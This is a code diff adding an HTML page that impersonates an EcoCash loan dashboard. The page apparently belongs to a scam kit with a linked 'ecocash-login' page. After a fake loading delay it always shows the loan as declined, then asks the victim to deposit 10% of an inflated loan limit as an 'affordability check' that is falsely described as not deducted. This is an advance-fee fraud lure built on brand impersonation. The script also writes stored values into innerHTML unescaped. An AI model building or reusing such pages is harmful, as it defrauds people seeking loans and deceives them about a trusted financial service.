@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>EcoCash - Loan Dashboard</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
+  body { background: #f3f4f6; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 20px; }
+
+  .container {
+    width: 400px;
+    background: white;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+  }
+
+  /* Header */
+  .header {
+    background: #0b5ea6;
+    padding: 30px 25px 20px;
+    color: white;
+    text-align: center;
+  }
+  .logo { font-size: 36px; font-weight: bold; margin-bottom: 5px; }
+  .logo span:first-child { color: #fff; }
+  .logo span:last-child { color: #e41e2b; }
+  .header-subtitle { font-size: 14px; opacity: 0.9; }
+
+  /* User info bar */
+  .user-bar {
+    background: #094d8a;
+    padding: 12px 25px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    color: white;
+    font-size: 13px;
+  }
+  .user-bar .phone { font-weight: bold; }
+  .user-bar .status {
+    background: #fbbf24;
+    color: #78350f;
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-weight: bold;
+    font-size: 11px;
+  }
+
+  /* Content */
+  .content { padding: 20px 25px; }
+
+  /* Loan details card */
+  .loan-card {
+    background: #f9fafb;
+    border: 1px solid #e5e7eb;
+    border-radius: 12px;
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+  .loan-card-title {
+    font-size: 16px;
+    font-weight: bold;
+    color: #374151;
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .loan-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px solid #f3f4f6;
+    font-size: 14px;
+  }
+  .loan-row:last-child { border-bottom: none; }
+  .loan-row .label { color: #6b7280; }
+  .loan-row .value { color: #1f2937; font-weight: 600; }
+  .loan-row .value.amount { color: #0b5ea6; font-size: 18px; }
+
+  /* Alert / Error box */
+  .alert-box {
+    background: #fef2f2;
+    border: 1px solid #fca5a5;
+    border-radius: 12px;
+    padding: 18px;
+    margin-bottom: 16px;
+  }
+  .alert-title {
+    color: #991b1b;
+    font-weight: bold;
+    font-size: 15px;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .alert-text {
+    color: #7f1d1d;
+    font-size: 13px;
+    line-height: 1.6;
+  }
+  .alert-text strong { color: #991b1b; }
+
+  /* Action box */
+  .action-box {
+    background: #fffbeb;
+    border: 1px solid #fde68a;
+    border-radius: 12px;
+    padding: 18px;
+    margin-bottom: 16px;
+    text-align: center;
+  }
+  .action-title {
+    color: #92400e;
+    font-weight: bold;
+    font-size: 14px;
+    margin-bottom: 6px;
+  }
+  .action-text {
+    color: #78350f;
+    font-size: 13px;
+    line-height: 1.5;
+  }
+  .deposit-amount {
+    font-size: 28px;
+    font-weight: bold;
+    color: #b45309;
+    margin: 10px 0;
+  }
+
+  /* Buttons */
+  .btn-group {
+    display: grid;
+    gap: 10px;
+    margin-top: 16px;
+    padding: 0 25px 25px;
+  }
+  .btn {
+    padding: 14px;
+    border-radius: 12px;
+    border: none;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s;
+  }
+  .btn-primary {
+    background: #0b5ea6;
+    color: white;
+  }
+  .btn-primary:hover { background: #094d8a; }
+  .btn-secondary {
+    background: #e2e8f0;
+    color: #0f172a;
+    border: 1px solid #cbd5e1;
+  }
+  .btn-secondary:hover { background: #cbd5e1; }
+
+  /* Footer */
+  .footer {
+    background: #0b5ea6;
+    padding: 14px 20px;
+    text-align: center;
+    color: white;
+    font-size: 13px;
+    opacity: 0.9;
+  }
+
+  /* Loading spinner */
+  .loading {
+    text-align: center;
+    padding: 40px;
+    color: #6b7280;
+  }
+  .spinner {
+    width: 32px; height: 32px;
+    border: 3px solid #e5e7eb;
+    border-top: 3px solid #0b5ea6;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 12px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="logo"><span>Eco</span><span>Cash</span></div>
+    <div class="header-subtitle">Loan Application Dashboard</div>
+  </div>
+
+  <!-- User bar -->
+  <div class="user-bar">
+    <div class="phone" id="userPhone">+263XXXXXXXXX</div>
+    <div class="status">UNDER REVIEW</div>
+  </div>
+
+  <!-- Content -->
+  <div class="content" id="dashboardContent">
+    <div class="loading" id="loadingState">
+      <div class="spinner"></div>
+      Loading your loan details...
+    </div>
+  </div>
+
+  <!-- Buttons -->
+  <div class="btn-group" id="btnGroup" style="display:none;">
+    <button class="btn btn-primary" onclick="window.location.href='index-2.html'">Reapply for Loan</button>
+    <button class="btn btn-secondary" onclick="window.location.href='ecocash-login.html'">Back to EcoCash</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">v4.0.1P</div>
+
+</div>
+
+<script>
+  window.onload = function() {
+    const phoneNumber = localStorage.getItem('loginPhone') || 'XXXXXXXXX';
+    document.getElementById('userPhone').textContent = '+263' + phoneNumber;
+
+    // Simulate loading
+    setTimeout(function() {
+      showDashboard(phoneNumber);
+    }, 2000);
+  };
+
+  function showDashboard(phoneNumber) {
+    const content = document.getElementById('dashboardContent');
+    const loanDataStr = localStorage.getItem('loanData');
+    const assessmentStr = localStorage.getItem('loanAssessment');
+
+    let loan = {
+      amount: '500',
+      term: '12',
+      monthlyRepayment: '42.76',
+      totalRepayable: '513.07',
+      loanType: 'Personal Loan',
+      firstName: 'Customer',
+      lastName: '',
+      phone: '+263' + phoneNumber
+    };
+
+    if (loanDataStr) {
+      try {
+        const parsed = JSON.parse(loanDataStr);
+        loan = { ...loan, ...parsed };
+      } catch (e) {}
+    }
+
+    let assessment = {
+      requestedAmount: parseFloat(loan.amount) || 500,
+      assignedLimit: (parseFloat(loan.amount) || 500) * 1.15,
+      requiredHolding: ((parseFloat(loan.amount) || 500) * 1.15) * 0.1
+    };
+
+    if (assessmentStr) {
+      try {
+        const parsedAssessment = JSON.parse(assessmentStr);
+        assessment = { ...assessment, ...parsedAssessment };
+      } catch (e) {}
+    }
+
+    const requestedAmount = parseFloat(assessment.requestedAmount) || (parseFloat(loan.amount) || 500);
+    const assignedLimit = parseFloat(assessment.assignedLimit) || Math.max(requestedAmount * 1.1, requestedAmount + 50);
+    const requiredHolding = parseFloat(assessment.requiredHolding) || (assignedLimit * 0.1);
+
+    content.innerHTML = `
+      <!-- Loan Details -->
+      <div class="loan-card">
+        <div class="loan-card-title">💰 Loan Application Details</div>
+        <div class="loan-row">
+          <span class="label">Applicant</span>
+          <span class="value">${loan.firstName} ${loan.lastName}</span>
+        </div>
+        <div class="loan-row">
+          <span class="label">Phone Number</span>
+          <span class="value">+263${phoneNumber}</span>
+        </div>
+        <div class="loan-row">
+          <span class="label">Loan Amount</span>
+          <span class="value amount">$${requestedAmount.toLocaleString()}</span>
+        </div>
+        <div class="loan-row">
+          <span class="label">Assigned Loan Limit</span>
+          <span class="value">$${assignedLimit.toLocaleString()}</span>
+        </div>
+        <div class="loan-row">
+          <span class="label">Repayment Period</span>
+          <span class="value">${loan.term} months</span>
+        </div>
+        <div class="loan-row">
+          <span class="label">Monthly Repayment</span>
+          <span class="value">$${loan.monthlyRepayment}/mo</span>
+        </div>
+        <div class="loan-row">
+          <span class="label">Total Repayable</span>
+          <span class="value">$${loan.totalRepayable}</span>
+        </div>
+        <div class="loan-row">
+          <span class="label">Loan Type</span>
+          <span class="value">${loan.loanType || 'Personal Loan'}</span>
+        </div>
+      </div>
+
+      <!-- Error / Rejection -->
+      <div class="alert-box">
+        <div class="alert-title">⚠️ Loan Application Failed</div>
+        <div class="alert-text">
+          Your loan application has been <strong>declined</strong> because your EcoCash account does not meet the required minimum balance thresholds for loan eligibility.<br/><br/>
+          Our system requires a minimum account activity and balance to approve loans. Your current account standing does not qualify.
+        </div>
+      </div>
+
+      <!-- Action Required -->
+      <div class="action-box">
+        <div class="action-title">📌 Action Required</div>
+        <div class="action-text">To continue, your wallet should show at least <strong>10%</strong> of your assigned loan limit as an affordability check:</div>
+        <div class="deposit-amount">$${requiredHolding.toFixed(2)}</div>
+        <div class="action-text">This amount is <strong>not deducted</strong> from your loan. It is only used to confirm repayment capacity based on account history.</div>
+      </div>
+    `;
+
+    document.getElementById('btnGroup').style.display = 'grid';
+  }
+</script>
+
+</body>
+
+</html>
